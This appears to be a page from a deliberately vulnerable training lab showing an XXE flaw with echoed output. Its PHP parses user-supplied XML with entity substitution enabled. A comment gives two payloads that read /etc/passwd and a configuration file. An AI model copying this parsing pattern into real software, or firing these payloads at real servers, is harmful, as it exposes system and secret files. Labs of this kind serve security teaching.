<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <link href="./css/result.css" rel="stylesheet">
        <link href="../fontawesome/web-fonts-with-css/css/fontawesome-all.min.css" rel="stylesheet">
        <title>XXE(有回显)</title>
    </head>
    <body>
        <a href='../index.html' style='position:absolute;top:20px;left:20px;text-decoration:none;color:white;'><i class='fas fa-home' style='font-size:20px;'></i>&#160Home</a>
        <br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
        <h1>有回显的XXE漏洞</h1>
<?php
    $xmlStr = $_GET['xml'];
    libxml_use_internal_errors(true);
    $xml = simplexml_load_string($xmlStr,"SimpleXMLElement",LIBXML_NOENT);
    if ($xml === false) {
        echo "Failed loading XML\n";
        foreach(libxml_get_errors() as $error) {
            echo "\t", $error->message;
        }
        echo '<br />';
    }
    var_dump((array)$xml);

    /*
    在textarea处填入
    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><bug><xxe>&xxe;</xxe></bug>
    或者
    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "../configure" >]><bug><xxe>&xxe;</xxe></bug>
    */

?>
<br/><br/><br/>
<a href="nofeedback.html" style='color:yellow;'>无回显的XXE漏洞&#160<i class='fas fa-arrow-right'></i></a>
</body>
</html>